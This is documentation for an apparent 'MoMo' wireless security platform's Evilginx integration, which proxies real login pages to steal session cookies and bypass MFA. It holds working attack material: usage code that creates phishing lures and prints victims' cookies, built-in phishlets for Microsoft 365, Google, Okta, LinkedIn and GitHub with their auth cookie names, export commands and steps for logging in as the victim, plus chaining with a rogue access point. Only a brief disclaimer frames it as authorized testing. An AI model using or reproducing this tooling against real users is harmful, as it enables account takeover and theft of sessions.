# Evilginx AiTM Integration

> **MFA Bypass through Adversary-in-the-Middle Session Hijacking**

## Summary

MoMo's Evilginx integration enables **Multi-Factor Authentication (MFA) bypass** by capturing session cookies through transparent reverse proxying. Unlike traditional credential harvesting (which fails against 2FA), this approach captures the authenticated session token issued AFTER the victim completes all authentication steps.

## How It Works

```
┌─────────────────────────────────────────────────────────────────────┐
│                        ATTACK FLOW                                   │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ┌──────────┐    ┌─────────────┐    ┌──────────────┐    ┌────────┐  │
│  │  Victim  │───▶│  Evil Twin  │───▶│   Evilginx   │───▶│  Real  │  │
│  │          │    │   (Rogue AP) │    │  (AiTM Proxy)│    │  Site  │  │
│  └──────────┘    └─────────────┘    └──────────────┘    └────────┘  │
│       │                                     │                  │     │
│       │  1. Connect to fake AP              │                  │     │
│       │  2. Redirect to phishing URL        │                  │     │
│       │  3. Enter credentials ──────────────┼─────────────────▶│     │
│       │  4. Complete 2FA ───────────────────┼─────────────────▶│     │
│       │  5. Session cookie issued ◀─────────┼──────────────────│     │
│       │                                     │                  │     │
│       │              ┌──────────────────────┘                  │     │
│       │              ▼                                          │     │
│       │     🔓 SESSION COOKIE CAPTURED!                        │     │
│       │                                                         │     │
│       │  6. Attacker imports cookie → Full account access      │     │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

## Key Difference from Traditional Phishing

| Traditional Phishing | Evilginx AiTM |
|---------------------|---------------|
| Static fake login page | Transparent proxy to real site |
| Captures username + password | Captures session cookies |
| ❌ Blocked by 2FA | ✅ **Bypasses ALL 2FA** |
| Victim notices fake URL | Victim sees real site content |
| Account access requires password | Account access via cookie import |

## Components

### 1. Evilginx Manager
Controls the evilginx3 binary process:
- Start/Stop proxy server
- Monitor captured sessions
- Track statistics

### 2. Phishlet Manager
Manages target configurations:
- **5 Built-in Phishlets:**
  - Microsoft 365 / Office 365
  - Google Accounts
  - Okta SSO
  - LinkedIn
  - GitHub
- Custom phishlet creation
- YAML import/export

### 3. Session Manager
Handles captured credentials:
- Store sessions with cookies
- Export in multiple formats (JSON, curl, Netscape)
- Track validity/expiration
- Generate reports

### 4. Lure Generator
Creates phishing URLs:
- Unique tracking IDs
- Custom redirect URLs
- URL parameters for targeting

## API Endpoints

```
GET  /api/evilginx/status              # Check proxy status
POST /api/evilginx/start               # Start evilginx proxy
POST /api/evilginx/stop                # Stop evilginx proxy

GET  /api/evilginx/phishlets           # List available phishlets
POST /api/evilginx/phishlets/{name}/enable   # Enable phishlet
POST /api/evilginx/phishlets/{name}/disable  # Disable phishlet

GET  /api/evilginx/lures               # List active lures
POST /api/evilginx/lures               # Create new lure
DELETE /api/evilginx/lures/{id}        # Delete lure

GET  /api/evilginx/sessions            # List captured sessions
GET  /api/evilginx/sessions/{id}       # Get session details
GET  /api/evilginx/sessions/{id}/export?format=json  # Export cookies
DELETE /api/evilginx/sessions/{id}     # Delete session

GET  /api/evilginx/sessions/report     # Generate text report
GET  /api/evilginx/metrics             # Prometheus metrics
```

## Usage Example

### 1. Start Attack
```python
from momo.infrastructure.evilginx import MockEvilginxManager

# Initialize manager
manager = MockEvilginxManager()
await manager.start()

# Enable target phishlet
await manager.enable_phishlet("microsoft365")

# Create phishing lure
lure = await manager.create_lure(
    "microsoft365",
    redirect_url="https://office.com"
)
print(f"Send to victim: {lure.url}")
```

### 2. Check Captured Sessions
```python
sessions = await manager.get_sessions()
for session in sessions:
    print(f"Victim: {session['username']}")
    print(f"Cookies: {session['cookies']}")
```

### 3. Export Cookies for Browser Import
```bash
# Get cookies in JSON format (for browser extension)
curl http://localhost:8080/api/evilginx/sessions/abc123/export?format=json

# Get as curl command
curl http://localhost:8080/api/evilginx/sessions/abc123/export?format=curl
```

### 4. Import to Browser
1. Export session cookies as JSON
2. Install "Cookie Editor" browser extension
3. Import JSON cookies
4. Navigate to target site → **You're logged in as the victim!**

## Configuration

Add to `configs/momo.yml`:

```yaml
evilginx:
  enabled: true
  binary_path: /usr/local/bin/evilginx
  external_ip: "YOUR_PUBLIC_IP"
  https_port: 443
  redirect_domain: "your-phishing-domain.com"
  mock: false  # Set true for testing without binary
```

## Requirements

- **evilginx3 binary**: https://github.com/kgretzky/evilginx2
- **Valid domain**: Must point to MoMo server
- **SSL certificate**: Auto-generated via Let's Encrypt
- **Root access**: Required for ports 80/443

## Security Considerations

⚠️ **This tool is for authorized security testing only!**

- Only use against systems you own or have explicit permission to test
- Session hijacking is illegal without authorization
- Captured credentials should be handled securely
- Delete sessions after testing

## Built-in Phishlets

| Target | Description | Auth Cookies |
|--------|-------------|--------------|
| `microsoft365` | Office 365, Outlook, Teams | ESTSAUTH, ESTSAUTHPERSISTENT |
| `google` | Gmail, Google Workspace | SID, SSID, HSID, APISID |
| `okta` | Okta SSO | sid, idx |
| `linkedin` | LinkedIn | li_at, JSESSIONID |
| `github` | GitHub | user_session, _gh_sess |

## Creating Custom Phishlets

```python
from momo.infrastructure.evilginx import PhishletManager

manager = PhishletManager()
phishlet = manager.create_custom_phishlet(
    name="custom_target",
    target_domain="internal.company.com",
    login_subdomain="sso",
    auth_cookies=["SESSION_ID", "AUTH_TOKEN"]
)
manager.save_phishlet(phishlet)
```

## Metrics

```
momo_evilginx_status              # 1 if running, 0 if stopped
momo_evilginx_sessions_total      # Total captured sessions
momo_evilginx_lures_total         # Total lures created
momo_evilginx_phishlets_active    # Active phishlets count
```

## Integration with Evil Twin

Evilginx works seamlessly with MoMo's Evil Twin module:

1. **Evil Twin** creates rogue AP → Victim connects
2. **Captive Portal** redirects to evilginx lure URL
3. **Evilginx** proxies to real site → Captures session
4. **Session Manager** stores cookies → Ready for export

This creates a **complete phishing infrastructure** in a portable device.

---

*Phase 0.9.0 - MoMo Wireless Security Platform*

